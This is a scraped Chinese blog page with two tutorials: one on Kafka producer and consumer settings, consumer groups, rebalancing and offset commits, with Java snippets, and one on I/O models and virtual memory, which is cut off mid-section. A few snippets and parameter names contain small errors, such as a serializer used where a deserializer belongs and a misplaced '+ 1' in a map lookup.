上面代码表明该 Producer 的压缩算法使用的是 GZIP 有压缩必有解压缩，Producer 使用压缩算法压缩消息后并发送给服务器后，由 Consumer 消费者进行解压缩，因为采用的何种压缩算法是随着 key、value 一起发送过去的，所以消费者知道采用何种压缩算法。 Kafka 重要参数配置在上一篇文章 带你涨姿势的认识一下kafka中，我们主要介绍了一下 kafka 集群搭建的参数，本篇文章我们来介绍一下 Kafka 生产者重要的配置，生产者有很多可配置的参数，在文档里（kafka.apache.org/documentati… key.serializer 用于 key 键的序列化，它实现了 org.apache.kafka.common.serialization.Serializer 接口 value.serializer 用于 value 值的序列化，实现了 org.apache.kafka.common.serialization.Serializer 接口 acks acks 参数指定了要有多少个分区副本接收消息，生产者才认为消息是写入成功的。此参数对消息丢失的影响较大 如果 acks = 0，就表示生产者也不知道自己产生的消息是否被服务器接收了，它才知道它写成功了。如果发送的途中产生了错误，生产者也不知道，它也比较懵逼，因为没有返回任何消息。这就类似于 UDP 的运输层协议，只管发，服务器接受不接受它也不关心。 如果 acks = 1，只要集群的 Leader 接收到消息，就会给生产者返回一条消息，告诉它写入成功。如果发送途中造成了网络异常或者 Leader 还没选举出来等其他情况导致消息写入失败，生产者会受到错误消息，这时候生产者往往会再次重发数据。因为消息的发送也分为 同步 和 异步，Kafka 为了保证消息的高效传输会决定是同步发送还是异步发送。如果让客户端等待服务器的响应（通过调用 Future 中的 get() 方法），显然会增加延迟，如果客户端使用回调，就会解决这个问题。 如果 acks = all，这种情况下是只有当所有参与复制的节点都收到消息时，生产者才会接收到一个来自服务器的消息。不过，它的延迟比 acks =1 时更高，因为我们要等待不只一个服务器节点接收消息。 buffer.memory 此参数用来设置生产者内存缓冲区的大小，生产者用它缓冲要发送到服务器的消息。如果应用程序发送消息的速度超过发送到服务器的速度，会导致生产者空间不足。这个时候，send() 方法调用要么被阻塞，要么抛出异常，具体取决于 block.on.buffer.null 参数的设置。 compression.type 此参数来表示生产者启用何种压缩算法，默认情况下，消息发送时不会被压缩。该参数可以设置为 snappy、gzip 和 lz4，它指定了消息发送给 broker 之前使用哪一种压缩算法进行压缩。下面是各压缩算法的对比 retries 生产者从服务器收到的错误有可能是临时性的错误（比如分区找不到首领），在这种情况下，reteis 参数的值决定了生产者可以重发的消息次数，如果达到这个次数，生产者会放弃重试并返回错误。默认情况下，生产者在每次重试之间等待 100ms，这个等待参数可以通过 retry.backoff.ms 进行修改。 batch.size 当有多个消息需要被发送到同一个分区时，生产者会把它们放在同一个批次里。该参数指定了一个批次可以使用的内存大小，按照字节数计算。当批次被填满，批次里的所有消息会被发送出去。不过生产者井不一定都会等到批次被填满才发送，任意条数的消息都可能被发送。 client.id 此参数可以是任意的字符串，服务器会用它来识别消息的来源，一般配置在日志里 max.in.flight.requests.per.connection 此参数指定了生产者在收到服务器响应之前可以发送多少消息，它的值越高，就会占用越多的内存，不过也会提高吞吐量。把它设为1 可以保证消息是按照发送的顺序写入服务器。 timeout.ms、request.timeout.ms 和 metadata.fetch.timeout.ms request.timeout.ms 指定了生产者在发送数据时等待服务器返回的响应时间，metadata.fetch.timeout.ms 指定了生产者在获取元数据（比如目标分区的首领是谁）时等待服务器返回响应的时间。如果等待时间超时，生产者要么重试发送数据，要么返回一个错误。timeout.ms 指定了 broker 等待同步副本返回消息确认的时间，与 asks 的配置相匹配—-如果在指定时间内没有收到同步副本的确认，那么 broker 就会返回一个错误。 max.block.ms 此参数指定了在调用 send() 方法或使用 partitionFor() 方法获取元数据时生产者的阻塞时间当生产者的发送缓冲区已捕，或者没有可用的元数据时，这些方法就会阻塞。在阻塞时间达到 max.block.ms 时，生产者会抛出超时异常。 max.request.size 该参数用于控制生产者发送的请求大小。它可以指能发送的单个消息的最大值，也可以指单个请求里所有消息的总大小。 receive.buffer.bytes 和 send.buffer.bytes Kafka 是基于 TCP 实现的，为了保证可靠的消息传输，这两个参数分别指定了 TCP Socket 接收和发送数据包的缓冲区的大小。如果它们被设置为 -1，就使用操作系统的默认值。如果生产者或消费者与 broker 处于不同的数据中心，那么可以适当增大这些值。 Kafka Consumer应用程序使用 KafkaConsumer 从 Kafka 中订阅主题并接收来自这些主题的消息，然后再把他们保存起来。应用程序首先需要创建一个 KafkaConsumer 对象，订阅主题并开始接受消息，验证消息并保存结果。一段时间后，生产者往主题写入的速度超过了应用程序验证数据的速度，这时候该如何处理？如果只使用单个消费者的话，应用程序会跟不上消息生成的速度，就像多个生产者像相同的主题写入消息一样，这时候就需要多个消费者共同参与消费主题中的消息，对消息进行分流处理。 Kafka 消费者从属于消费者群组。一个群组中的消费者订阅的都是相同的主题，每个消费者接收主题一部分分区的消息。下面是一个 Kafka 分区消费示意图 上图中的主题 T1 有四个分区，分别是分区0、分区1、分区2、分区3，我们创建一个消费者群组1，消费者群组中只有一个消费者，它订阅主题T1，接收到 T1 中的全部消息。由于一个消费者处理四个生产者发送到分区的消息，压力有些大，需要帮手来帮忙分担任务，于是就演变为下图 这样一来，消费者的消费能力就大大提高了，但是在某些环境下比如用户产生消息特别多的时候，生产者产生的消息仍旧让消费者吃不消，那就继续增加消费者。 如上图所示，每个分区所产生的消息能够被每个消费者群组中的消费者消费，如果向消费者群组中增加更多的消费者，那么多余的消费者将会闲置，如下图所示 向群组中增加消费者是横向伸缩消费能力的主要方式。总而言之，我们可以通过增加消费组的消费者来进行水平扩展提升消费能力。这也是为什么建议创建主题时使用比较多的分区数，这样可以在消费负载高的情况下增加消费者来提升性能。另外，消费者的数量不应该比分区数多，因为多出来的消费者是空闲的，没有任何帮助。 Kafka 一个很重要的特性就是，只需写入一次消息，可以支持任意多的应用读取这个消息。换句话说，每个应用都可以读到全量的消息。为了使得每个应用都能读到全量消息，应用需要有不同的消费组。对于上面的例子，假如我们新增了一个新的消费组 G2，而这个消费组有两个消费者，那么就演变为下图这样 在这个场景中，消费组 G1 和消费组 G2 都能收到 T1 主题的全量消息，在逻辑意义上来说它们属于不同的应用。 总结起来就是如果应用需要读取全量消息，那么请为该应用设置一个消费组；如果该应用消费能力不足，那么可以考虑在这个消费组里增加消费者。 消费者组和分区重平衡消费者组是什么消费者组（Consumer Group）是由一个或多个消费者实例（Consumer Instance）组成的群组，具有可扩展性和可容错性的一种机制。消费者组内的消费者共享一个消费者组ID，这个ID 也叫做 Group ID，组内的消费者共同对一个主题进行订阅和消费，同一个组中的消费者只能消费一个分区的消息，多余的消费者会闲置，派不上用场。 我们在上面提到了两种消费方式 一个消费者群组消费一个主题中的消息，这种消费模式又称为点对点的消费方式，点对点的消费方式又被称为消息队列 一个主题中的消息被多个消费者群组共同消费，这种消费模式又称为发布-订阅模式 消费者重平衡我们从上面的消费者演变图中可以知道这么一个过程：最初是一个消费者订阅一个主题并消费其全部分区的消息，后来有一个消费者加入群组，随后又有更多的消费者加入群组，而新加入的消费者实例分摊了最初消费者的部分消息，这种把分区的所有权通过一个消费者转到其他消费者的行为称为重平衡，英文名也叫做 Rebalance 。如下图所示 重平衡非常重要，它为消费者群组带来了高可用性 和 伸缩性，我们可以放心的添加消费者或移除消费者，不过在正常情况下我们并不希望发生这样的行为。在重平衡期间，消费者无法读取消息，造成整个消费者组在重平衡的期间都不可用。另外，当分区被重新分配给另一个消费者时，消息当前的读取状态会丢失，它有可能还需要去刷新缓存，在它重新恢复状态之前会拖慢应用程序。 消费者通过向组织协调者（Kafka Broker）发送心跳来维护自己是消费者组的一员并确认其拥有的分区。对于不同不的消费群体来说，其组织协调者可以是不同的。只要消费者定期发送心跳，就会认为消费者是存活的并处理其分区中的消息。当消费者检索记录或者提交它所消费的记录时就会发送心跳。 如果过了一段时间 Kafka 停止发送心跳了，会话（Session）就会过期，组织协调者就会认为这个 Consumer 已经死亡，就会触发一次重平衡。如果消费者宕机并且停止发送消息，组织协调者会等待几秒钟，确认它死亡了才会触发重平衡。在这段时间里，死亡的消费者将不处理任何消息。在清理消费者时，消费者将通知协调者它要离开群组，组织协调者会触发一次重平衡，尽量降低处理停顿。 重平衡是一把双刃剑，它为消费者群组带来高可用性和伸缩性的同时，还有有一些明显的缺点(bug)，而这些 bug 到现在社区还无法修改。 重平衡的过程对消费者组有极大的影响。因为每次重平衡过程中都会导致万物静止，参考 JVM 中的垃圾回收机制，也就是 Stop The World ，STW，(引用自《深入理解 Java 虚拟机》中 p76 关于 Serial 收集器的描述)： 更重要的是它在进行垃圾收集时，必须暂停其他所有的工作线程。直到它收集结束。Stop The World 这个名字听起来很帅，但这项工作实际上是由虚拟机在后台自动发起并完成的，在用户不可见的情况下把用户正常工作的线程全部停掉，这对很多应用来说都是难以接受的。 也就是说，在重平衡期间，消费者组中的消费者实例都会停止消费，等待重平衡的完成。而且重平衡这个过程很慢…… 创建消费者上面的理论说的有点多，下面就通过代码来讲解一下消费者是如何消费的 在读取消息之前，需要先创建一个 KafkaConsumer 对象。创建 KafkaConsumer 对象与创建 KafkaProducer 对象十分相似 — 把需要传递给消费者的属性放在 properties 对象中，后面我们会着重讨论 Kafka 的一些配置，这里我们先简单的创建一下，使用3个属性就足矣，分别是 bootstrap.server，key.deserializer，value.deserializer 。 还有一个属性是 group.id 这个属性不是必须的，它指定了 KafkaConsumer 是属于哪个消费者群组。创建不属于任何一个群组的消费者也是可以的 1234Properties properties &#x3D; new Properties(); properties.put(&quot;bootstrap.server&quot;,&quot;192.168.1.9:9092&quot;); properties.put(&quot;key.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;); properties.put(&quot;value.serializer&quot;,&quot;org.apache.kafka.common.serialization.StringSerializer&quot;);KafkaConsumer&lt;String,String&gt; consumer &#x3D; new KafkaConsumer&lt;&gt;(properties);复制代码 主题订阅创建好消费者之后，下一步就开始订阅主题了。subscribe() 方法接受一个主题列表作为参数，使用起来比较简单 12consumer.subscribe(Collections.singletonList(&quot;customerTopic&quot;));复制代码 为了简单我们只订阅了一个主题 customerTopic，参数传入的是一个正则表达式，正则表达式可以匹配多个主题，如果有人创建了新的主题，并且主题的名字与正则表达式相匹配，那么会立即触发一次重平衡，消费者就可以读取新的主题。 要订阅所有与 test 相关的主题，可以这样做 12consumer.subscribe(&quot;test.*&quot;);复制代码 轮询我们知道，Kafka 是支持订阅/发布模式的，生产者发送数据给 Kafka Broker，那么消费者是如何知道生产者发送了数据呢？其实生产者产生的数据消费者是不知道的，KafkaConsumer 采用轮询的方式定期去 Kafka Broker 中进行数据的检索，如果有数据就用来消费，如果没有就再继续轮询等待，下面是轮询等待的具体实现 123456789101112131415try &#123; while (true) &#123; ConsumerRecords&lt;String, String&gt; records &#x3D; consumer.poll(Duration.ofSeconds(100)); for (ConsumerRecord&lt;String, String&gt; record : records) &#123; int updateCount &#x3D; 1; if (map.containsKey(record.value())) &#123; updateCount &#x3D; (int) map.get(record.value() + 1); &#125; map.put(record.value(), updateCount); &#125; &#125;&#125;finally &#123; consumer.close();&#125;复制代码 这是一个无限循环。消费者实际上是一个长期运行的应用程序，它通过轮询的方式向 Kafka 请求数据。 第三行代码非常重要，Kafka 必须定期循环请求数据，否则就会认为该 Consumer 已经挂了，会触发重平衡，它的分区会移交给群组中的其它消费者。传给 poll() 方法的是一个超市时间，用 java.time.Duration 类来表示，如果该参数被设置为 0 ，poll() 方法会立刻返回，否则就会在指定的毫秒数内一直等待 broker 返回数据。 poll() 方法会返回一个记录列表。每条记录都包含了记录所属主题的信息，记录所在分区的信息、记录在分区中的偏移量，以及记录的键值对。我们一般会遍历这个列表，逐条处理每条记录。 在退出应用程序之前使用 close() 方法关闭消费者。网络连接和 socket 也会随之关闭，并立即触发一次重平衡，而不是等待群组协调器发现它不再发送心跳并认定它已经死亡。 线程安全性 在同一个群组中，我们无法让一个线程运行多个消费者，也无法让多个线程安全的共享一个消费者。按照规则，一个消费者使用一个线程，如果一个消费者群组中多个消费者都想要运行的话，那么必须让每个消费者在自己的线程中运行，可以使用 Java 中的 ExecutorService 启动多个消费者进行进行处理。 消费者配置到目前为止，我们学习了如何使用消费者 API，不过只介绍了几个最基本的属性，Kafka 文档列出了所有与消费者相关的配置说明。大部分参数都有合理的默认值，一般不需要修改它们，下面我们就来介绍一下这些参数。 fetch.min.bytes 该属性指定了消费者从服务器获取记录的最小字节数。broker 在收到消费者的数据请求时，如果可用的数据量小于 fetch.min.bytes 指定的大小，那么它会等到有足够的可用数据时才把它返回给消费者。这样可以降低消费者和 broker 的工作负载，因为它们在主题使用频率不是很高的时候就不用来回处理消息。如果没有很多可用数据，但消费者的 CPU 使用率很高，那么就需要把该属性的值设得比默认值大。如果消费者的数量比较多，把该属性的值调大可以降低 broker 的工作负载。 fetch.max.wait.ms 我们通过上面的 fetch.min.bytes 告诉 Kafka，等到有足够的数据时才会把它返回给消费者。而 fetch.max.wait.ms 则用于指定 broker 的等待时间，默认是 500 毫秒。如果没有足够的数据流入 kafka 的话，消费者获取的最小数据量要求就得不到满足，最终导致 500 毫秒的延迟。如果要降低潜在的延迟，就可以把参数值设置的小一些。如果 fetch.max.wait.ms 被设置为 100 毫秒的延迟，而 fetch.min.bytes 的值设置为 1MB，那么 Kafka 在收到消费者请求后，要么返回 1MB 的数据，要么在 100 ms 后返回所有可用的数据。就看哪个条件首先被满足。 max.partition.fetch.bytes 该属性指定了服务器从每个分区里返回给消费者的最大字节数。它的默认值时 1MB，也就是说，KafkaConsumer.poll() 方法从每个分区里返回的记录最多不超过 max.partition.fetch.bytes 指定的字节。如果一个主题有20个分区和5个消费者，那么每个消费者需要至少4 MB的可用内存来接收记录。在为消费者分配内存时，可以给它们多分配一些，因为如果群组里有消费者发生崩溃，剩下的消费者需要处理更多的分区。max.partition.fetch.bytes 的值必须比 broker 能够接收的最大消息的字节数(通过 max.message.size 属性配置大)，否则消费者可能无法读取这些消息，导致消费者一直挂起重试。 在设置该属性时，另外一个考量的因素是消费者处理数据的时间。消费者需要频繁的调用 poll() 方法来避免会话过期和发生分区再平衡，如果单次调用poll() 返回的数据太多，消费者需要更多的时间进行处理，可能无法及时进行下一个轮询来避免会话过期。如果出现这种情况，可以把 max.partition.fetch.bytes 值改小，或者延长会话过期时间。 session.timeout.ms 这个属性指定了消费者在被认为死亡之前可以与服务器断开连接的时间，默认是 3s。如果消费者没有在 session.timeout.ms 指定的时间内发送心跳给群组协调器，就会被认定为死亡，协调器就会触发重平衡。把它的分区分配给消费者群组中的其它消费者，此属性与 heartbeat.interval.ms 紧密相关。heartbeat.interval.ms 指定了 poll() 方法向群组协调器发送心跳的频率，session.timeout.ms 则指定了消费者可以多久不发送心跳。所以，这两个属性一般需要同时修改，heartbeat.interval.ms 必须比 session.timeout.ms 小，一般是 session.timeout.ms 的三分之一。如果 session.timeout.ms 是 3s，那么 heartbeat.interval.ms 应该是 1s。把 session.timeout.ms 值设置的比默认值小，可以更快地检测和恢复崩愤的节点，不过长时间的轮询或垃圾收集可能导致非预期的重平衡。把该属性的值设置得大一些，可以减少意外的重平衡，不过检测节点崩溃需要更长的时间。 auto.offset.reset 该属性指定了消费者在读取一个没有偏移量的分区或者偏移量无效的情况下的该如何处理。它的默认值是 latest，意思指的是，在偏移量无效的情况下，消费者将从最新的记录开始读取数据。另一个值是 earliest，意思指的是在偏移量无效的情况下，消费者将从起始位置处开始读取分区的记录。 enable.auto.commit 我们稍后将介绍几种不同的提交偏移量的方式。该属性指定了消费者是否自动提交偏移量，默认值是 true，为了尽量避免出现重复数据和数据丢失，可以把它设置为 false，由自己控制何时提交偏移量。如果把它设置为 true，还可以通过 auto.commit.interval.ms 属性来控制提交的频率 partition.assignment.strategy 我们知道，分区会分配给群组中的消费者。PartitionAssignor 会根据给定的消费者和主题，决定哪些分区应该被分配给哪个消费者，Kafka 有两个默认的分配策略Range 和 RoundRobin client.id 该属性可以是任意字符串，broker 用他来标识从客户端发送过来的消息，通常被用在日志、度量指标和配额中 max.poll.records 该属性用于控制单次调用 call() 方法能够返回的记录数量，可以帮你控制在轮询中需要处理的数据量。 receive.buffer.bytes 和 send.buffer.bytes socket 在读写数据时用到的 TCP 缓冲区也可以设置大小。如果它们被设置为 -1，就使用操作系统默认值。如果生产者或消费者与 broker 处于不同的数据中心内，可以适当增大这些值，因为跨数据中心的网络一般都有比较高的延迟和比较低的带宽。 提交和偏移量的概念特殊偏移我们上面提到，消费者在每次调用poll() 方法进行定时轮询的时候，会返回由生产者写入 Kafka 但是还没有被消费者消费的记录，因此我们可以追踪到哪些记录是被群组里的哪个消费者读取的。消费者可以使用 Kafka 来追踪消息在分区中的位置（偏移量） 消费者会向一个叫做 _consumer_offset 的特殊主题中发送消息，这个主题会保存每次所发送消息中的分区偏移量，这个主题的主要作用就是消费者触发重平衡后记录偏移使用的，消费者每次向这个主题发送消息，正常情况下不触发重平衡，这个主题是不起作用的，当触发重平衡后，消费者停止工作，每个消费者可能会分到对应的分区，这个主题就是让消费者能够继续处理消息所设置的。 如果提交的偏移量小于客户端最后一次处理的偏移量，那么位于两个偏移量之间的消息就会被重复处理 如果提交的偏移量大于最后一次消费时的偏移量，那么处于两个偏移量中间的消息将会丢失 既然_consumer_offset 如此重要，那么它的提交方式是怎样的呢？下面我们就来说一下####提交方式 KafkaConsumer API 提供了多种方式来提交偏移量 自动提交最简单的方式就是让消费者自动提交偏移量。如果 enable.auto.commit 被设置为true，那么每过 5s，消费者会自动把从 poll() 方法轮询到的最大偏移量提交上去。提交时间间隔由 auto.commit.interval.ms 控制，默认是 5s。与消费者里的其他东西一样，自动提交也是在轮询中进行的。消费者在每次轮询中会检查是否提交该偏移量了，如果是，那么就会提交从上一次轮询中返回的偏移量。 提交当前偏移量把 auto.commit.offset 设置为 false，可以让应用程序决定何时提交偏移量。使用 commitSync() 提交偏移量。这个 API 会提交由 poll() 方法返回的最新偏移量，提交成功后马上返回，如果提交失败就抛出异常。 commitSync() 将会提交由 poll() 返回的最新偏移量，如果处理完所有记录后要确保调用了 commitSync()，否则还是会有丢失消息的风险，如果发生了在均衡，从最近一批消息到发生在均衡之间的所有消息都将被重复处理。 异步提交异步提交 commitAsync() 与同步提交 commitSync() 最大的区别在于异步提交不会进行重试，同步提交会一致进行重试。 同步和异步组合提交一般情况下，针对偶尔出现的提交失败，不进行重试不会有太大的问题，因为如果提交失败是因为临时问题导致的，那么后续的提交总会有成功的。但是如果在关闭消费者或再均衡前的最后一次提交，就要确保提交成功。 因此，在消费者关闭之前一般会组合使用commitAsync和commitSync提交偏移量。 提交特定的偏移量消费者API允许调用 commitSync() 和 commitAsync() 方法时传入希望提交的 partition 和 offset 的 map，即提交特定的偏移量。 参考资料： 《深入理解Kafka：核心设计与实践原理》","categories":[{"name":"kafka","slug":"kafka","permalink":"https://gschaos.club/categories/kafka/"}],"tags":[{"name":"java","slug":"java","permalink":"https://gschaos.club/tags/java/"},{"name":"kafka","slug":"kafka","permalink":"https://gschaos.club/tags/kafka/"}]},{"title":"IO模型","slug":"IO模型","date":"2020-10-26T16:00:00.000Z","updated":"2020-10-27T13:18:51.000Z","comments":true,"path":"IO模型/","link":"","permalink":"https://gschaos.club/IO%E6%A8%A1%E5%9E%8B/","excerpt":"","text":"I/O 操作比在内存中进行数据处理任务所需时间更长，差别要以数量级计。许多程序员一门心思扑在他们的对象如何加工数据上，对影响数据读取和存储的环境问题却不屑一顾。影响应用程序执行效率的限定性因素，往往并非处理速率，而是 I/O。 作者：keep_trying_gogo 出处：https://blog.csdn.net/yjp198713/column/info/18912 IO模型一基础知识一、I/O与CPU时间的比较I/O 操作比在内存中进行数据处理任务所需时间更长，差别要以数量级计。许多程序员一门心思扑在他们的对象如何加工数据上，对影响数据读取和存储的环境问题却不屑一顾。 表 1-1 所示为对数据单元进行磁盘读写所需时间的假设值。 第一列为处理一个数据单元所需平均时间 第二列为对该数据单元进行磁盘读写所需时间 第三列为每秒所能处理的数据单元数 第四列为改变第一第二列的值所能产生的数据吞吐率的提升值 前三行显示了处理阶段的效率提升会如何影响吞吐率。把单位处理时间减半，仅能提高吞吐率2.2％。而另一方面，仅仅缩短 I/O 延迟 10％，就可使吞吐率增加 9.7％；把 I/O 时间减半，吞吐率几乎翻番。当您了解到 I/O 花在一个数据单元上的时间是处理时间的 20 倍，这样的结果就不足为奇了。表中所列并非真实数据，目的只在说明相对时间度量，现实情况绝非如此简单。正如您所看到的，影响应用程序执行效率的限定性因素，往往并非处理速率，而是 I/O。 二、用户空间与内核空间现在操作系统都是采用虚拟存储器，那么对32位操作系统而言，它的寻址空间（虚拟存储空间）为4G（2的32次方）。操作系统的核心是内核，独立于普通的应用程序，可以访问受保护的内存空间，也有访问底层硬件设备的所有权限。为了保证用户进程不能直接操作内核（kernel），保证内核的安全，操心系统将虚拟空间划分为两部分，一部分为内核空间，一部分为用户空间。针对linux操作系统而言，将最高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为内核空间，而将较低的3G字节（从虚拟地址0x00000000到0xBFFFFFFF），供各个进程使用，称为用户空间。 三、缓冲区操作缓冲区，以及缓冲区如何工作，是所有 I/O 的基础。所谓“输入／输出”讲的无非就是把数据移进或移出缓冲区。进程执行 I/O 操作，归结起来，也就是向操作系统发出请求，让它要么把缓冲区里的数据排干（写），要么用数据把缓冲区填满（读）。进程使用这一机制处理所有数据进出操作。操作系统内部处理这一任务的机制，其复杂程度可能超乎想像，但就概念而言，却非常直白易懂。 图 1-1. I/O 缓冲区操作简图图中明显忽略了很多细节，仅显示了涉及到的基本步骤。 上图1.1 简单描述了数据从外部磁盘向运行中的进程的内存区域移动的过程。进程使用 read( )系统调用，要求其缓冲区被填满。内核随即向磁盘控制硬件发出命令，要求其从磁盘读取数据。磁盘控制器把数据直接写入内核内存缓冲区，这一步通过 DMA 完成，无需主 CPU 协助。一旦磁盘控制器把缓冲区装满，内核即把数据从内核空间的临时缓冲区拷贝到进程执行 read( )调用时指定的缓冲区。 注意图中用户空间和内核空间的概念。用户空间是常规进程所在区域。 JVM 就是常规进程，驻守于用户空间。用户空间是非特权区域：比如，在该区域执行的代码就不能直接访问硬件设备。内核空间是操作系统所在区域。内核代码有特别的权力：它能与设备控制器通讯，控制着用户区域进程的运行状态，等等。最重要的是，所有 I/O 都直接（如这里所述）或间接通过内核空间。 当进程请求 I/O 操作的时候，它执行一个系统调用（有时称为陷阱）将控制权移交给内核。C/C++程序员所熟知的底层函数 open( )、 read( )、 write( )和 close( )要做的无非就是建立和执行适当的系统调用。当内核以这种方式被调用，它随即采取任何必要步骤，找到进程所需数据，并把数据传送到用户空间内的指定缓冲区。内核试图对数据进行高速缓存或预读取，因此进程所需数据可能已经在内核空间里了。如果是这样，该数据只需简单地拷贝出来即可。如果数据不在内核空间，则进程被挂起，内核着手把数据读进内存。 看了图 1-1，您可能会觉得，把数据从内核空间拷贝到用户空间似乎有些多余。为什么不直接让磁盘控制器把数据送到用户空间的缓冲区呢？这样做有几个问题。 首先，硬件通常不能直接访问用户空间 。 其次，像磁盘这样基于块存储的硬件设备操作的是固定大小的数据块，而用户进程请求的可能是任意大小的或非对齐的数据块。 在数据往来于用户空间与存储设备的过程中，内核负责数据的分解、再组合工作，因此充当着中间人的角色。 四、发散／汇聚许多操作系统能把组装／分解过程进行得更加高效。根据发散／汇聚的概念，进程只需一个系统调用，就能把一连串缓冲区地址传递给操作系统。然后，内核就可以顺序填充或排干多个缓冲区，读的时候就把数据发散到多个用户空间缓冲区，写的时候再从多个缓冲区把数据汇聚起来，如下 图。 图 1-2. 三个缓冲区的发散读操作这样用户进程就不必多次执行系统调用（那样做可能代价不菲），内核也可以优化数据的处理过程，因为它已掌握待传输数据的全部信息。如果系统配有多个 CPU，甚至可以同时填充或排干多个缓冲区 五、虚拟内存所有现代操作系统都使用虚拟内存。虚拟内存意为使用虚假（或虚拟）地址取代物理（硬件RAM）内存地址。这样做好处颇多，总结起来可分为两大类： 一个以上的虚拟地址可指向同一个物理内存地址。 虚拟内存空间可大于实际可用的硬件内存。 前面提到，设备控制器不能通过 DMA 直接存储到用户空间，但通过利用上面提到的第一项，则可以达到相同效果。把内核空间地址与用户空间的虚拟地址映射到同一个物理地址，这样，DMA 硬件（只能访问物理内存地址）就可以填充对内核与用户空间进程同时可见的缓冲区，如下图。 图 1-3. 内存空间多重映射 这样省去了内核与用户空间的往来拷贝，但前提条件是，内核与用户缓冲区必须使用相同的页对齐，缓冲区的大小还必须是磁盘控制器块大小（通常为 512 字节磁盘扇区）的倍数。操作系统把内存地址空间划分为页，即固定大小的字节组。内存页的大小总是磁盘块大小的倍数，通常为 2 次幂（这样可简化寻址操作）。典型的内存页为 1,024、 2,048 和 4,096 字节。虚拟和物理内存页的大小总是相同的。图 1-4 显示了来自多个虚拟地址的虚拟内存页是如何映射到物理内的。 图 1-4. 内存页 六、内存页面调度为了支持虚拟内存的第二个特性（寻址空间大于物理内存），就必须进行虚拟内存分页（经常称为交换，虽然真正的交换是在进程层面完成，而非页层面）。依照该方案，虚拟内存空间的页面能够继续存在于外部磁盘存储，这样就为物理内存中的其他虚拟页面腾出了空间。从本质上说，物理内存充当了分页区的高速缓存；而所谓分页区，即从物理内存置换出来，转而存储于磁盘上的内存页面。 图 1-5 显示了分属于四个进程的虚拟页面，其中每个进程都有属于自己的虚拟内存空间。进程A 有五个页面，其中两个装入内存，其余存储于磁盘。 图 1-5. 用于分页区高速缓存的物理内存 把内存页大小设定为磁盘块大小的倍数，这样内核就可直接向磁盘控制硬件发布命令，把内存页写入磁盘，在需要时再重新装入。结果是，所有磁盘 I/O 都在页层面完成。对于采用分页技术的现代操作系统而言，这也是数据在磁盘与物理内存之间往来的唯一方式。 现代 CPU 包含一个称为内存管理单元（MMU）的子系统，逻辑上位于 CPU 与物理内存之间。该设备包含虚拟地址向物理内存地址转换时所需映射信息。当 CPU 引用某内存地址时， MMU负责确定该地址所在页（往往通过对地址值进行移位或屏蔽位操作实现），并将虚拟页号转换为物理页号（这一步由硬件完成，速度极快）。如果当前不存在与该虚拟页形成有效映射的物理内存页， MMU 会向 CPU 提交一个页错误。 页错误随即产生一个陷阱（类似于系统调用），把控制权移交给内核，附带导致错误的虚拟地址信息，然后内核采取步骤验证页的有效性。内核会安排页面调入操作，把缺失的页内容读回物理内存。这往往导致别的页被移出物理内存，好给新来的页让地方。在这种情况下，如果待移出的页已经被碰过了（自创建或上次页面调入以来，内容已发生改变），还必须首先执行页面调出，把页内容拷贝到磁盘上的分页区。 如果所要求的地址不是有效的虚拟内存地址（不属于正在执行的进程的任何一个内存段），则该页不能通过验证，段错误随即产生。于是，控制权转交给内核的另一部分，通常导致的结果就是进程被强令关闭。 一旦出错的页通过了验证， MMU 随即更新，建立新的虚拟到物理的映射（如有必要，中断被移出页的映射），用户进程得以继续。造成页错误的用户进程对此不会有丝毫察觉，一切都在不知不觉中进行。 七、文件I/O文件 I/O 属文件系统范畴，文件系统与磁盘迥然不同。磁盘把数据存在扇区上，通常一个扇区512 字节。磁盘属硬件设备，对何谓文件一无所知，它只是提供了一系列数据存取窗口。在这点上，磁盘扇区与内存页颇有相似之处：都是统一大小，都可作为大的数组被访问。文件系统是更高层次的抽象，是安排、解释磁盘（或其他随机存取块设备）数据的一种独特方式。您所写代码几乎无一例外地要与文件系统打交道，而不是直接与磁盘打交道。是文件系统定义了文件名、路径、文件、文件属性等抽象概念。 前面讲到，所有 I/O 都是通过请求页面调度完成的。您应该还记得，页面调度是非常底层的操作，仅发生于磁盘扇区与内存页之间的直接传输。而文件 I/O 则可以任意大小、任意定位。那么，底层的页面调度是如何转换为文件 I/O 的？ 文件系统把一连串大小一致的数据块组织到一起。有些块存储元信息，如空闲块、目录、索引等的映射，有些包含文件数据。单个文件的元信息描述了哪些块包含文件数据、数据在哪里结束、最后一次更新是什么时候，等等。 当用户进程请求读取文件数据时，文件系统需要确定数据具体在磁盘什么位置，然后着手把相关磁盘扇区读进内存。老式的操作系统往往直接向磁盘驱动器发布命令，要求其读取所需磁盘扇区。而采用分页技术的现代操作系统则利用请求页面调度取得所需数据。 操作系统还有个页的概念，其大小或者与基本内存页一致，或者是其倍数。典型的操作系统页从 2,048 到 8,192 字节不等，且始终是基本内存页大小的倍数。采用分页技术的操作系统执行 I/O 的全过程可总结为以下几步： 确定请求的数据分布在文件系统的哪些页（磁盘扇区组）。磁盘上的文件内容和元数据可能跨越多个文件系统页，而且这些页可能也不连续。 在内核空间分配足够数量的内存页，以容纳得到确定的文件系统页。 在内存页与磁盘上的文件系统页之间建立映射。 为每一个内存页产生页错误。 虚拟内存系统俘获页错误，安排页面调入，从磁盘上读取页内容，使页有效。 一旦页面调入操作完成，文件系统即对原始数据进行解析，取得所需文件内容或属性 信息。 需要注意的是，这些文件系统数据也会同其他内存页一样得到高速缓存。对于随后发生的 I/O请求，文件数据的部分或全部可能仍旧位于物理内存当中，无需再从磁盘读取即可重复使用。大多数操作系统假设进程会继续读取文件剩余部分，因而会预读额外的文件系统页。如果内存争用情况不严重，这些文件系统页可能在相当长的时间内继续有效。这样的话，当稍后该文件又被相同或不同的进程再次打开，可能根本无需访问磁盘。这种情况您可能也碰到过：当重复执行类似的操作，如在几个文件中进行字符串检索，第二遍运行得似乎快多了。 类似的步骤在写文件数据时也会采用。这时，文件内容的改变（通过 write( )）将导致文件系统页变脏，随后通过页面调出，与磁盘上的文件内容保持同步。文件的创建方式是，先把文件映射到空闲文件系统页，在随后的写操作中，再将文件系统页刷新到磁盘。 内存映射文件传统的文件 I/O 是通过用户进程发布 read( )和 write( )系统调用来传输数据的。为了在内核空间的文件系统页与用户空间的内存区之间移动数据，一次以上的拷贝操作几乎总是免不了的。这是因为，在文件系统页与用户缓冲区之间往往没有一一对应关系。但是，还有一种大多数操作系统都支持的特殊类型的 I/O 操作，允许用户进程最大限度地利用面向页的系统 I/O 特性，并完全摒弃缓冲区拷贝。这就是内存映射 I/O，如图 1-6 所示。 图 